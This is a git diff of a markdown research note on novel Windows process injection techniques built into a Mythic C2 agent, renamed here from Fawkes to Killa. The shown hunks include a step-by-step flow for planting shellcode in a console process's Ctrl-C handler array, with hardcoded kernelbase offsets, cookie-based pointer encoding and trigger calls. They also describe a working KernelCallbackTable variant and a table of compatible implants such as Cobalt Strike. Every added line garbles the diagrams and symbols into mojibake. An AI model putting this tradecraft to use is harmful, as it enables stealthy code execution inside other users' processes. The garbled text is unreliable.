@@ -1,6 +1,6 @@
 # Opus Injection Research
 
-Novel process injection techniques developed for the Fawkes agent, focusing on unexplored callback mechanisms in Windows.
+Novel process injection techniques developed for the Killa agent, focusing on unexplored callback mechanisms in Windows.
 
 ## Overview
 
@@ -16,7 +16,7 @@ The "Opus Injection" family of techniques explores Windows callback mechanisms t
 
 This technique hijacks the Windows console control handler mechanism to achieve code execution. By injecting a fake handler into the target process's handler array and triggering a console control event, Windows itself executes our shellcode as part of its normal handler dispatch routine.
 
-**Status:** ✅ Implemented and tested
+**Status:** âœ… Implemented and tested
 **Target:** Console processes only
 **Shellcode:** Position-independent code (C-based agents, msfvenom, Cobalt Strike)
 
@@ -56,17 +56,17 @@ kernelbase!ConsoleStateLock         @ RVA 0x39CC00  - Critical section (we bypas
 #### Memory Layout
 
 ```
-kernelbase.dll + 0x399490:  [Pointer to Handler Array] ──────┐
-                                                              │
-                                                              ▼
-Heap Memory:                ┌─────────────────────────────────────────┐
-                            │ EncodedHandler[0]  (8 bytes, encoded)   │
-                            │ EncodedHandler[1]  (8 bytes, encoded)   │
-                            │ EncodedHandler[2]  (8 bytes, encoded)   │
-                            │ ...                                     │
-                            │ EncodedHandler[n]  (8 bytes, encoded)   │
-                            │ [unused capacity]                       │
-                            └─────────────────────────────────────────┘
+kernelbase.dll + 0x399490:  [Pointer to Handler Array] â”€â”€â”€â”€â”€â”€â”
+                                                              â”‚
+                                                              â–¼
+Heap Memory:                â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+                            â”‚ EncodedHandler[0]  (8 bytes, encoded)   â”‚
+                            â”‚ EncodedHandler[1]  (8 bytes, encoded)   â”‚
+                            â”‚ EncodedHandler[2]  (8 bytes, encoded)   â”‚
+                            â”‚ ...                                     â”‚
+                            â”‚ EncodedHandler[n]  (8 bytes, encoded)   â”‚
+                            â”‚ [unused capacity]                       â”‚
+                            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
 kernelbase.dll + 0x39CBB0:  [HandlerListLength = n+1]  (DWORD)
 kernelbase.dll + 0x39CBB4:  [AllocatedLength = capacity]  (DWORD)
@@ -121,61 +121,61 @@ NtQueryInformationProcess(
 ### Attack Flow
 
 ```
-┌─────────────────────────────────────────────────────────────────────────┐
-│                        OPUS INJECTION VARIANT 1                         │
-│                    Ctrl-C Handler Chain Injection                       │
-└─────────────────────────────────────────────────────────────────────────┘
+â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+â”‚                        OPUS INJECTION VARIANT 1                         â”‚
+â”‚                    Ctrl-C Handler Chain Injection                       â”‚
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
 Step 1: Open Target Process
-    ├── OpenProcess() with VM_READ | VM_WRITE | VM_OPERATION | QUERY_INFORMATION
-    └── Target must be a console process
+    â”œâ”€â”€ OpenProcess() with VM_READ | VM_WRITE | VM_OPERATION | QUERY_INFORMATION
+    â””â”€â”€ Target must be a console process
 
 Step 2: Locate kernelbase.dll
-    ├── EnumProcessModulesEx() to enumerate loaded modules
-    └── Find kernelbase.dll base address in target
+    â”œâ”€â”€ EnumProcessModulesEx() to enumerate loaded modules
+    â””â”€â”€ Find kernelbase.dll base address in target
 
 Step 3: Calculate Structure Addresses
-    ├── HandlerList pointer    = kernelbase + 0x399490
-    ├── HandlerListLength      = kernelbase + 0x39CBB0
-    └── AllocatedHandlerLength = kernelbase + 0x39CBB4
+    â”œâ”€â”€ HandlerList pointer    = kernelbase + 0x399490
+    â”œâ”€â”€ HandlerListLength      = kernelbase + 0x39CBB0
+    â””â”€â”€ AllocatedHandlerLength = kernelbase + 0x39CBB4
 
 Step 4: Read Current State
-    ├── Read HandlerList pointer → get heap array address
-    ├── Read HandlerListLength   → current handler count
-    ├── Read AllocatedLength     → array capacity
-    └── Verify: count < capacity (room for new handler)
+    â”œâ”€â”€ Read HandlerList pointer â†’ get heap array address
+    â”œâ”€â”€ Read HandlerListLength   â†’ current handler count
+    â”œâ”€â”€ Read AllocatedLength     â†’ array capacity
+    â””â”€â”€ Verify: count < capacity (room for new handler)
 
 Step 5: Get Process Cookie
-    ├── NtQueryInformationProcess(ProcessCookie)
-    └── Returns 32-bit cookie value
+    â”œâ”€â”€ NtQueryInformationProcess(ProcessCookie)
+    â””â”€â”€ Returns 32-bit cookie value
 
 Step 6: Allocate Shellcode Memory
-    ├── VirtualAllocEx() with PAGE_EXECUTE_READWRITE
-    └── Get shellcode address in target process
+    â”œâ”€â”€ VirtualAllocEx() with PAGE_EXECUTE_READWRITE
+    â””â”€â”€ Get shellcode address in target process
 
 Step 7: Write Shellcode
-    └── WriteProcessMemory() shellcode to allocated region
+    â””â”€â”€ WriteProcessMemory() shellcode to allocated region
 
 Step 8: Encode Shellcode Address
-    ├── encoded = shellcode_addr XOR cookie
-    └── encoded = RotateRight(encoded, cookie & 0x3F)
+    â”œâ”€â”€ encoded = shellcode_addr XOR cookie
+    â””â”€â”€ encoded = RotateRight(encoded, cookie & 0x3F)
 
 Step 9: Install Handler
-    ├── Calculate target slot: HandlerArray + (HandlerListLength * 8)
-    └── WriteProcessMemory() encoded pointer to slot
+    â”œâ”€â”€ Calculate target slot: HandlerArray + (HandlerListLength * 8)
+    â””â”€â”€ WriteProcessMemory() encoded pointer to slot
 
 Step 10: Update Handler Count
-    └── WriteProcessMemory() increment HandlerListLength
+    â””â”€â”€ WriteProcessMemory() increment HandlerListLength
 
 Step 11: Trigger Execution
-    ├── FreeConsole()           → Detach from our console
-    ├── AttachConsole(pid)      → Attach to target's console
-    ├── GenerateConsoleCtrlEvent(CTRL_C_EVENT, 0)  → Trigger handlers
-    ├── FreeConsole()           → Detach from target
-    └── AllocConsole()          → Restore our console
+    â”œâ”€â”€ FreeConsole()           â†’ Detach from our console
+    â”œâ”€â”€ AttachConsole(pid)      â†’ Attach to target's console
+    â”œâ”€â”€ GenerateConsoleCtrlEvent(CTRL_C_EVENT, 0)  â†’ Trigger handlers
+    â”œâ”€â”€ FreeConsole()           â†’ Detach from target
+    â””â”€â”€ AllocConsole()          â†’ Restore our console
 
 Step 12: Execution
-    └── Windows decodes our pointer and calls shellcode as a handler!
+    â””â”€â”€ Windows decodes our pointer and calls shellcode as a handler!
 ```
 
 ### Implementation Details
@@ -272,14 +272,14 @@ Any process with an attached console is a potential target. A process has a cons
 
 | Shellcode Type | Compatible | Tested | Notes |
 |----------------|------------|--------|-------|
-| calc.bin (simple PIC) | ✅ Yes | ✅ Confirmed | Works reliably |
-| msfvenom payloads | ✅ Yes | Expected | Standard PIC shellcode |
-| Cobalt Strike | ✅ Yes | Expected | C-based, standard PIC |
-| Xenon (C-based agent) | ✅ Yes | ✅ Confirmed | C-based Mythic agent works |
-| Havoc | ✅ Yes | Expected | C-based |
-| Brute Ratel | ✅ Yes | Expected | C-based |
-| Go-based (Fawkes, Merlin, Sliver) | ❌ No | ✅ Confirmed fails | Go runtime needs TLS, stack setup |
-| .NET/C# (Apollo) | ❌ No | ✅ Confirmed fails | CLR needs managed environment |
+| calc.bin (simple PIC) | âœ… Yes | âœ… Confirmed | Works reliably |
+| msfvenom payloads | âœ… Yes | Expected | Standard PIC shellcode |
+| Cobalt Strike | âœ… Yes | Expected | C-based, standard PIC |
+| Xenon (C-based agent) | âœ… Yes | âœ… Confirmed | C-based Mythic agent works |
+| Havoc | âœ… Yes | Expected | C-based |
+| Brute Ratel | âœ… Yes | Expected | C-based |
+| Go-based (Killa, Merlin, Sliver) | âŒ No | âœ… Confirmed fails | Go runtime needs TLS, stack setup |
+| .NET/C# (Apollo) | âŒ No | âœ… Confirmed fails | CLR needs managed environment |
 
 #### Why Runtime-Dependent Shellcode Fails
 
@@ -384,7 +384,7 @@ WNF is an obscure publish/subscribe notification system in Windows used internal
 
 ```
 ntdll!LdrpThunkSignature+0x258:  [RtlRunOnce guard - one-time init]
-ntdll!LdrpThunkSignature+0x260:  [WNF Context Pointer] → Heap structure
+ntdll!LdrpThunkSignature+0x260:  [WNF Context Pointer] â†’ Heap structure
 ```
 
 The WNF subscription root is stored at a fixed offset from `ntdll!LdrpThunkSignature+0x260`.
@@ -392,37 +392,37 @@ The WNF subscription root is stored at a fixed offset from `ntdll!LdrpThunkSigna
 #### Architecture
 
 ```
-┌─────────────────────────────────────────────────────────────────────────┐
-│                     WNF SUBSCRIPTION ARCHITECTURE                        │
-└─────────────────────────────────────────────────────────────────────────┘
+â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+â”‚                     WNF SUBSCRIPTION ARCHITECTURE                        â”‚
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
-ntdll!LdrpThunkSignature+0x260:  [WNF Context Pointer] ──────┐
-                                                              │
-                                                              ▼
-                                    ┌─────────────────────────────────┐
-                                    │       WNF Context Structure      │
-                                    │  +0x10: List head pointer        │
-                                    │  +0x18: First entry / encoded    │
-                                    └─────────────────────────────────┘
-                                                   │
-                                                   ▼
-                         ┌─────────────────────────────────────────────┐
-                         │         WNF_NAME_SUBSCRIPTION               │
-                         │  (Keyed by WNF_STATE_NAME - 64-bit ID)      │
-                         │  Contains linked list of user subscriptions │
-                         └─────────────────────────────────────────────┘
-                                          │
-                    ┌─────────────────────┼─────────────────────┐
-                    ▼                     ▼                     ▼
-        ┌───────────────────┐  ┌───────────────────┐  ┌───────────────────┐
-        │ WNF_USER_SUB      │  │ WNF_USER_SUB      │  │ WNF_USER_SUB      │
-        │ +0x18: Info ptr   │  │                   │  │                   │
-        │ +0x20: RefCount   │  │                   │  │                   │
-        │ +0x28: Callback   │  │                   │  │                   │
-        │ +0x30: Context    │  │                   │  │                   │
-        │ +0x38: SubProcTag │  │                   │  │                   │
-        │ +0x50: SerialGrp  │  │                   │  │                   │
-        └───────────────────┘  └───────────────────┘  └───────────────────┘
+ntdll!LdrpThunkSignature+0x260:  [WNF Context Pointer] â”€â”€â”€â”€â”€â”€â”
+                                                              â”‚
+                                                              â–¼
+                                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+                                    â”‚       WNF Context Structure      â”‚
+                                    â”‚  +0x10: List head pointer        â”‚
+                                    â”‚  +0x18: First entry / encoded    â”‚
+                                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
+                                                   â”‚
+                                                   â–¼
+                         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+                         â”‚         WNF_NAME_SUBSCRIPTION               â”‚
+                         â”‚  (Keyed by WNF_STATE_NAME - 64-bit ID)      â”‚
+                         â”‚  Contains linked list of user subscriptions â”‚
+                         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
+                                          â”‚
+                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+                    â–¼                     â–¼                     â–¼
+        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+        â”‚ WNF_USER_SUB      â”‚  â”‚ WNF_USER_SUB      â”‚  â”‚ WNF_USER_SUB      â”‚
+        â”‚ +0x18: Info ptr   â”‚  â”‚                   â”‚  â”‚                   â”‚
+        â”‚ +0x20: RefCount   â”‚  â”‚                   â”‚  â”‚                   â”‚
+        â”‚ +0x28: Callback   â”‚  â”‚                   â”‚  â”‚                   â”‚
+        â”‚ +0x30: Context    â”‚  â”‚                   â”‚  â”‚                   â”‚
+        â”‚ +0x38: SubProcTag â”‚  â”‚                   â”‚  â”‚                   â”‚
+        â”‚ +0x50: SerialGrp  â”‚  â”‚                   â”‚  â”‚                   â”‚
+        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 ```
 
 #### Key Functions
@@ -563,12 +563,12 @@ Both WNF and FLS callback mechanisms are protected by Control Flow Guard (CFG) o
 
 | Factor | Variant 1 (Ctrl-C) | Variant 2 (WNF) | Variant 3 (FLS) | Candidate C (ExFilter) | Candidate G (ETW) | Candidate A (TxnScope) |
 |--------|-------------------|-----------------|-----------------|------------------------|-------------------|------------------------|
-| **CFG Protected** | ❌ No | ✅ Yes | ✅ Yes | ✅ Yes | ✅ Yes | N/A |
+| **CFG Protected** | âŒ No | âœ… Yes | âœ… Yes | âœ… Yes | âœ… Yes | N/A |
 | **Structure Complexity** | Low (array) | High (nested) | Medium (binary array) | Low (single pointer) | Medium (consumer sessions) | N/A |
 | **Global Context** | kernelbase.dll | ntdll.dll | ntdll.dll | kernelbase.dll | sechost.dll | TEB (per-thread) |
 | **Target Scope** | Console only | All processes | All processes | All processes | ETW consumers | N/A |
 | **Trigger** | Ctrl+C event | NtUpdateWnfStateData | FlsFree / thread exit | Unhandled exception | ETW events | N/A |
-| **Implementation** | ✅ Complete | ❌ Blocked by CFG | ❌ Blocked by CFG | ❌ Blocked by CFG | ❌ Blocked by CFG | ❌ Vestigial (unused) |
+| **Implementation** | âœ… Complete | âŒ Blocked by CFG | âŒ Blocked by CFG | âŒ Blocked by CFG | âŒ Blocked by CFG | âŒ Vestigial (unused) |
 | **Failure Reason** | - | CFG validation | CFG validation | CFG validation | CFG validation | Callbacks never invoked |
 
 ### Recommendation
@@ -591,13 +591,13 @@ For future work, if CFG bypass becomes available or acceptable:
 After investigating 6 callback-based mechanisms, a definitive pattern has emerged:
 
 **CFG Protection Status:**
-- ✅ WNF Callbacks (Variant 2) - `ntdll!RtlpWnfWalkUserSubscriptionList` uses `guard_dispatch_icall`
-- ✅ FLS Callbacks (Variant 3) - `ntdll!RtlpFlsFree` uses `guard_dispatch_icall` (2 sites)
-- ✅ Exception Filter (Candidate C) - `kernelbase!UnhandledExceptionFilter` uses `guard_dispatch_icall`
-- ✅ ETW Consumer Callbacks (Candidate G) - `sechost!EtwpDoEventTraceCallbacks` uses `guard_dispatch_icall` (2 sites)
-- ✅ DLL Notifications (Candidate D) - `ntdll!LdrpSendDllNotifications` uses `guard_dispatch_icall`
-- ✅ RPC Dispatch Tables (Candidate H) - `rpcrt4!RpcInvokeCheckICall` uses `_guard_check_icall_fptr`
-- ❌ Ctrl-C Handlers (Variant 1) - **NO CFG protection** ✅ WORKING
+- âœ… WNF Callbacks (Variant 2) - `ntdll!RtlpWnfWalkUserSubscriptionList` uses `guard_dispatch_icall`
+- âœ… FLS Callbacks (Variant 3) - `ntdll!RtlpFlsFree` uses `guard_dispatch_icall` (2 sites)
+- âœ… Exception Filter (Candidate C) - `kernelbase!UnhandledExceptionFilter` uses `guard_dispatch_icall`
+- âœ… ETW Consumer Callbacks (Candidate G) - `sechost!EtwpDoEventTraceCallbacks` uses `guard_dispatch_icall` (2 sites)
+- âœ… DLL Notifications (Candidate D) - `ntdll!LdrpSendDllNotifications` uses `guard_dispatch_icall`
+- âœ… RPC Dispatch Tables (Candidate H) - `rpcrt4!RpcInvokeCheckICall` uses `_guard_check_icall_fptr`
+- âŒ Ctrl-C Handlers (Variant 1) - **NO CFG protection** âœ… WORKING
 
 ### Key Observations
 
@@ -683,14 +683,14 @@ Continuing callback-based research shows diminishing returns. Recommended next d
 
 The Kernel Callback Table is an array of function pointers stored in the Process Environment Block (PEB) at offset `+0x058`. This table is initialized when `user32.dll` loads into a GUI process and contains callbacks for handling window messages and interprocess communications via win32k.sys.
 
-### Status: **IMPLEMENTED** ✅
+### Status: **IMPLEMENTED** âœ…
 
 **Note:** This technique is publicly documented and not novel (see [KernelCallbackTable-Injection-PoC](https://github.com/0xHossam/KernelCallbackTable-Injection-PoC)). However, it provides a valuable complement to Variant 1 by targeting GUI processes instead of console processes.
 
 ### Key Characteristics
 
 - **Target:** GUI processes (requires `user32.dll`)
-- **PEB Location:** `PEB+0x058` → KernelCallbackTable pointer
+- **PEB Location:** `PEB+0x058` â†’ KernelCallbackTable pointer
 - **Target Callback:** `__fnCOPYDATA` (index 0, handles `WM_COPYDATA` messages)
 - **Trigger:** Send `WM_COPYDATA` window message to target window
 - **CFG Status:** Unknown on Windows 11 25H2 (PoC suggests it may work)
@@ -746,7 +746,7 @@ When the target processes `WM_COPYDATA`, it dispatches to the callback table, in
 1. **Older mechanism** - PEB callback table predates modern mitigations
 2. **PoC exists** - Suggests it works on at least some Windows versions
 3. **Different from callback registration** - Modifies PEB directly, not callback registration
-4. **Win32k boundary** - Kernel→user callbacks may have different protection
+4. **Win32k boundary** - Kernelâ†’user callbacks may have different protection
 
 ### Implementation Complexity
 
@@ -757,15 +757,15 @@ When the target processes `WM_COPYDATA`, it dispatches to the callback table, in
 
 ### Research Questions
 
-- [X] **Does this work on Windows 11 25H2?** → YES - Implementation complete in Fawkes Mythic agent
-- [ ] Is callback dispatch CFG protected? → Testing in progress
-- [X] **Can we modify PEB+0x058 remotely?** → YES - Successfully updates KernelCallbackTable pointer
-- [ ] Which callback indices exist in the table? → __fnCOPYDATA (index 0) confirmed working
-- [ ] Are there better trigger messages than WM_COPYDATA? → Further research needed
+- [X] **Does this work on Windows 11 25H2?** â†’ YES - Implementation complete in Killa Mythic agent
+- [ ] Is callback dispatch CFG protected? â†’ Testing in progress
+- [X] **Can we modify PEB+0x058 remotely?** â†’ YES - Successfully updates KernelCallbackTable pointer
+- [ ] Which callback indices exist in the table? â†’ __fnCOPYDATA (index 0) confirmed working
+- [ ] Are there better trigger messages than WM_COPYDATA? â†’ Further research needed
 
 ### Go Shellcode Compatibility
 
-**COMPATIBLE** ✅ - Unlike Variant 1 (Ctrl-C handlers), the WM_COPYDATA callback context is compatible with Go's runtime requirements. This makes Variant 4 suitable for injecting Go-based agent shellcode (Fawkes, Merlin, etc.) into GUI processes.
+**COMPATIBLE** âœ… - Unlike Variant 1 (Ctrl-C handlers), the WM_COPYDATA callback context is compatible with Go's runtime requirements. This makes Variant 4 suitable for injecting Go-based agent shellcode (Killa, Merlin, etc.) into GUI processes.
 
 ### Advantages
 
@@ -783,9 +783,9 @@ When the target processes `WM_COPYDATA`, it dispatches to the callback table, in
 
 ### Implementation Status
 
-- [X] ✅ Implemented in Fawkes Mythic C2 agent (`opus-injection` command, Variant 4)
-- [X] ✅ Tested on Windows 11 25H2 (functional)
-- [X] ✅ Go shellcode compatibility confirmed (compatible with Go runtime)
+- [X] âœ… Implemented in Killa Mythic C2 agent (`opus-injection` command, Variant 4)
+- [X] âœ… Tested on Windows 11 25H2 (functional)
+- [X] âœ… Go shellcode compatibility confirmed (compatible with Go runtime)
 - [ ] CFG protection status testing in progress
 - [ ] Performance comparison with Variant 1
 
@@ -836,7 +836,7 @@ After initial research phase, refocusing on:
 
 ---
 
-## 🔬 PRIORITY CANDIDATES (Truly Novel Techniques)
+## ðŸ”¬ PRIORITY CANDIDATES (Truly Novel Techniques)
 
 ### Candidate G: ETW (Event Tracing for Windows) Consumer Callbacks
 
@@ -894,7 +894,7 @@ uf sechost!EtwpDoEventTraceCallbacks
 // Processes register to consume ETW events:
 EVENT_TRACE_LOGFILE TraceLogfile;
 TraceLogfile.LogFileName = L"MyTrace.etl";  // or real-time: NULL
-TraceLogfile.EventRecordCallback = MyCallbackFunction;  // ← Function pointer!
+TraceLogfile.EventRecordCallback = MyCallbackFunction;  // â† Function pointer!
 TraceLogfile.ProcessTraceMode = PROCESS_TRACE_MODE_EVENT_RECORD | PROCESS_TRACE_MODE_REAL_TIME;
 
 TRACEHANDLE hTrace = OpenTrace(&TraceLogfile);
@@ -964,7 +964,7 @@ Can identify via:
 #### Research Questions
 
 - [ ] Where exactly are `EventRecordCallback` pointers stored at runtime?
-- [X] **Is callback invocation in `ProcessTrace` CFG protected?** → YES - BLOCKED
+- [X] **Is callback invocation in `ProcessTrace` CFG protected?** â†’ YES - BLOCKED
 - [ ] What is the internal structure for ETW consumer sessions?
 - [ ] How to reliably locate consumer structures in target process?
 - [ ] Can we identify which ETW providers a process is subscribed to?
@@ -1031,10 +1031,10 @@ Many Windows processes act as RPC (Remote Procedure Call) servers, exposing inte
 
 The RPC dispatch mechanism uses a multi-layered approach:
 
-1. `NdrServerCall2` → wraps `NdrStubCall2`
-2. `NdrStubCall2` → loads function pointer from dispatch table at `[rax+r12*8]`, calls `Invoke`
-3. `Invoke` → calls `RpcInvokeCheckICall` for validation, then `call r10` (direct)
-4. `RpcInvokeCheckICall` → **calls `_guard_check_icall_fptr`** (CFG validator!)
+1. `NdrServerCall2` â†’ wraps `NdrStubCall2`
+2. `NdrStubCall2` â†’ loads function pointer from dispatch table at `[rax+r12*8]`, calls `Invoke`
+3. `Invoke` â†’ calls `RpcInvokeCheckICall` for validation, then `call r10` (direct)
+4. `RpcInvokeCheckICall` â†’ **calls `_guard_check_icall_fptr`** (CFG validator!)
 
 ##### Critical Blocker: CFG Protection via _guard_check_icall_fptr
 
@@ -1084,7 +1084,7 @@ uf rpcrt4!RpcInvokeCheckICall   # CFG validation wrapper
 // RPC servers register interfaces with dispatch tables:
 typedef struct {
     unsigned int DispatchTableCount;
-    RPC_DISPATCH_FUNCTION* DispatchTable;  // ← Array of function pointers!
+    RPC_DISPATCH_FUNCTION* DispatchTable;  // â† Array of function pointers!
 } RPC_DISPATCH_TABLE;
 
 typedef RPC_STATUS (*RPC_DISPATCH_FUNCTION)(
@@ -1171,7 +1171,7 @@ MyRpcCall(hBinding, ...);  // Triggers shellcode!
 
 - [ ] Where are RPC_SERVER_INTERFACE structures stored in memory?
 - [ ] Where are dispatch tables located (rpcrt4.dll? per-server allocation)?
-- [X] **Is RPC dispatch function invocation CFG protected?** → YES - BLOCKED via `_guard_check_icall_fptr`
+- [X] **Is RPC dispatch function invocation CFG protected?** â†’ YES - BLOCKED via `_guard_check_icall_fptr`
 - [ ] How to enumerate registered interfaces in a target process?
 - [ ] Are dispatch table pointers encoded?
 
@@ -1256,7 +1256,7 @@ typedef DWORD (WINAPI *APPLICATION_RECOVERY_CALLBACK)(
 );
 
 HRESULT RegisterApplicationRecoveryCallback(
-    APPLICATION_RECOVERY_CALLBACK pRecoveryCallback,  // ← Function pointer!
+    APPLICATION_RECOVERY_CALLBACK pRecoveryCallback,  // â† Function pointer!
     PVOID pvParameter,
     DWORD dwPingInterval,    // How often to ping (milliseconds)
     DWORD dwFlags
@@ -1427,7 +1427,7 @@ HANDLE hWait;
 RegisterWaitForSingleObject(
     &hWait,
     hMemNotify,               // Wait on memory notification
-    WaitCallback,             // ← Function pointer!
+    WaitCallback,             // â† Function pointer!
     pContext,
     INFINITE,                 // Wait indefinitely
     WT_EXECUTEDEFAULT         // Flags
@@ -1524,7 +1524,7 @@ uf ntdll!LdrpSendDllNotifications
    - LoadLibrary call
    - Delay-load DLL resolution
    - COM object instantiation
-5. Notification callback fires → shellcode executes
+5. Notification callback fires â†’ shellcode executes
 ```
 
 #### Why This Might Be Interesting
@@ -1535,9 +1535,9 @@ uf ntdll!LdrpSendDllNotifications
 
 #### Research Questions
 
-- [X] **Is the callback invocation CFG protected?** → YES - BLOCKED
-- [X] **What's the notification entry structure?** → Linked list with callback at +0x10, context at +0x18
-- [X] **Are there lock/synchronization requirements?** → Yes - LdrpDllNotificationLock critical section
+- [X] **Is the callback invocation CFG protected?** â†’ YES - BLOCKED
+- [X] **What's the notification entry structure?** â†’ Linked list with callback at +0x10, context at +0x18
+- [X] **Are there lock/synchronization requirements?** â†’ Yes - LdrpDllNotificationLock critical section
 - [ ] What's the callback signature?
 
 #### Complexity Assessment (If Not CFG Protected)
@@ -1789,10 +1789,10 @@ mov     qword ptr [ntdll!RtlpUnhandledExceptionFilter],rax  ; Store encoded
 
 ```
 KiUserExceptionDispatcher
-    └──> RtlDispatchException
-            └──> [SEH/VEH handling attempts]
-                    └──> UnhandledExceptionFilter (kernelbase)
-                            └──> Calls user's filter (CFG PROTECTED!)
+    â””â”€â”€> RtlDispatchException
+            â””â”€â”€> [SEH/VEH handling attempts]
+                    â””â”€â”€> UnhandledExceptionFilter (kernelbase)
+                            â””â”€â”€> Calls user's filter (CFG PROTECTED!)
 ```
 
 ##### Critical Blocker: CFG Protection
@@ -1895,7 +1895,7 @@ Each entry contains a callback function pointer that's called on DLL events.
    - LoadLibrary call
    - Delay-load DLL resolution
    - COM object instantiation
-5. Notification callback fires → shellcode executes
+5. Notification callback fires â†’ shellcode executes
 ```
 
 #### Why This Might Be Interesting
@@ -1951,7 +1951,7 @@ typedef struct _RTL_HEAP_PARAMETERS {
     BOOLEAN InitialCommit;
     BOOLEAN SegmentFlags;
     UCHAR Unknown[2];
-    PRTL_HEAP_COMMIT_ROUTINE CommitRoutine;  // ← Function pointer!
+    PRTL_HEAP_COMMIT_ROUTINE CommitRoutine;  // â† Function pointer!
 } RTL_HEAP_PARAMETERS, *PRTL_HEAP_PARAMETERS;
 
 typedef NTSTATUS (NTAPI *PRTL_HEAP_COMMIT_ROUTINE)(
@@ -1968,7 +1968,7 @@ typedef NTSTATUS (NTAPI *PRTL_HEAP_COMMIT_ROUTINE)(
 2. Locate CommitRoutine pointer in heap parameters
 3. Overwrite with shellcode address
 4. Trigger heap expansion (large allocation)
-5. Commit routine called → shellcode executes
+5. Commit routine called â†’ shellcode executes
 ```
 
 #### Why This Might Work
@@ -2080,39 +2080,39 @@ dt ntdll!_CPTABLEINFO
 | **B: ActiveFrame** | Very High | Unknown | High | Unknown | Low |
 | **E: Heap Commit** | Very High | Unknown | High | Medium | Low |
 | **F: NLS Callbacks** | Very High | Unknown | Very High | Low | Low |
-| **H: RPC Dispatch Tables** | Very High | ❌ **PROTECTED** | High | Low-Medium | ~~TOP~~ **BLOCKED** |
-| **D: DllNotification** | Medium | ❌ **PROTECTED** | Medium | Low | ~~TOP~~ **BLOCKED** |
-| **G: ETW Consumer Callbacks** | Very High | ❌ **PROTECTED** | Medium-High | Very Low (natural) | ~~TOP~~ **BLOCKED** |
+| **H: RPC Dispatch Tables** | Very High | âŒ **PROTECTED** | High | Low-Medium | ~~TOP~~ **BLOCKED** |
+| **D: DllNotification** | Medium | âŒ **PROTECTED** | Medium | Low | ~~TOP~~ **BLOCKED** |
+| **G: ETW Consumer Callbacks** | Very High | âŒ **PROTECTED** | Medium-High | Very Low (natural) | ~~TOP~~ **BLOCKED** |
 | **A: TEB TxnScope** | Very High | N/A (vestigial) | N/A | N/A | ~~HIGH~~ **NOT VIABLE** |
-| **C: UnhandledException** | Medium-High | ❌ **PROTECTED** | Low | Medium | ~~HIGH~~ **BLOCKED** |
+| **C: UnhandledException** | Medium-High | âŒ **PROTECTED** | Low | Medium | ~~HIGH~~ **BLOCKED** |
